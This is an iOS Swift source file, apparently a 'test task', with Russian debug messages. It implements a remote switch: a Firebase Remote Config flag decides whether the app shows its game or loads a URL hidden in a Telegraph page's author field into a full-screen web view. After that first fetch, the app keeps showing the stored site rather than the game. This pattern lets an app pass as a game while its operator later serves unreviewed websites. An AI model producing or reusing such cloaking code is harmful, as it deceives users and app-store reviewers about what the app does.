//
//  FirstTestVC.swift
//  testTask01.24
//
//  Created by Nikolai  on 16.01.2024.
//

import UIKit
import FirebaseRemoteConfig
import WebKit

class FirstWebVC: UIViewController {
    
    let defaults = UserDefaults.standard
    var remoteConfig = RemoteConfig.remoteConfig()
    var baseURLdefault = "https://api.telegra.ph/getPage/LinkDefault-01-16"
//    var baseURLdefault = "https://wavokyha.com"
    var webView = WKWebView()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        view.backgroundColor = .white
        
        let settings = RemoteConfigSettings()
        settings.minimumFetchInterval = 0
        remoteConfig.configSettings = settings
        
        checkLink()
    }
    
    private func checkLink() {
        
        if defaults.string(forKey: "linkForWebView") != nil {
            //Запускаем WebView
            print("We have LINK FOR WebView")
            print("LINK = \(defaults.string(forKey: "linkForWebView")!)")
            openWebView()
        } else {
            //Обращаемся к Remote Config
            print("We don't have LINK FOR WebView")
            getIsClick()
        }
    }
    
    private func getIsClick() {
        print("старт функции получения IsClick")
        remoteConfig.fetchAndActivate { status, error in
            if error != nil {
                print("error из remote config = \(error!.localizedDescription)")
            } else {
                if status != .error {
                    let localIsClick = self.remoteConfig["isClick"].boolValue
                    print("is local click = \(localIsClick)")
                    switch localIsClick {
                    case true:
                        print("Идем получать baseURL")
                        self.getBaseURL()
                    case false:
                        print("Запускаем игру")
                        self.showGameVC()
                    }
                } else { //Этот else можно будет убрать
                    print("error в статусе из remote config")
                }
            }
        }
    }
    
    private func getBaseURL() {
        print("старт функции получения getBaseURL")
        remoteConfig.fetchAndActivate { status, error in
            if error != nil {
                print("error из remote config = \(error!.localizedDescription)")
            } else {
                if status != .error {
                    let baseURL = self.remoteConfig["baseURL"].stringValue
                    print("base url = \(baseURL)")
                    if baseURL == "" {
                        print("НЕ получили baseURL из Remote Config")
                        print("используем дефолтное значение для baseURL")
                    } else {
                        print("получили baseURL из Remote Config")
                        self.baseURLdefault = baseURL!
                    }
                } else { //Этот else можно будет убрать
                    print("error в статусе из remote config")
                }
                
                self.fetchURL(baseURL: self.baseURLdefault)
            }
        }
    }
    
    private func fetchURL(baseURL: String) {
        print("старт функции получения ссылки для WebView по baseURL")
        
        NetworkDataFetch.shared.fetchLink(urlString: baseURL) { ourResponse, error in
            if error == nil {
                guard let ourResponse = ourResponse else { return }
        
                print("JSON из Телеграфа = \(ourResponse)")
                print("LINK = \(ourResponse.result.authorName)")
                
                if ourResponse.result.authorName == "" || ourResponse.result.authorName == nil {
                    print("Пустая ссылка для WebView")
                    print("Открываем игру")
                    self.showGameVC()
                } else {
                    print("Сохраняем ссылку для WebView в UserDefaults")
                    self.defaults.set(ourResponse.result.authorName!, forKey: "linkForWebView")
                    self.openWebView()
                }

            } else {
                print(error!.localizedDescription)
            }
        }
    }
    
    private func openWebView() {
        print("старт функции открытия ссылки в WebView")
        
        setWebView()
        reloadRequest()
    }
    
    private func setWebView() {
        view.addSubview(webView)
        webView.translatesAutoresizingMaskIntoConstraints = false
        
        NSLayoutConstraint.activate([
            webView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            webView.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            webView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor),
            webView.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor)
        ])
    }
    
    private func reloadRequest() {
        guard let url = URL(string: defaults.string(forKey: "linkForWebView")!) else { return }
        let urlRequest = URLRequest(url: url)
        webView.load(urlRequest)
    }
    
    private func showGameVC() {
        print("старт функции показа ИГРЫ")
        let vc = LaunchingVC()
        vc.modalPresentationStyle = .fullScreen
        present(vc, animated: false)
    }
}
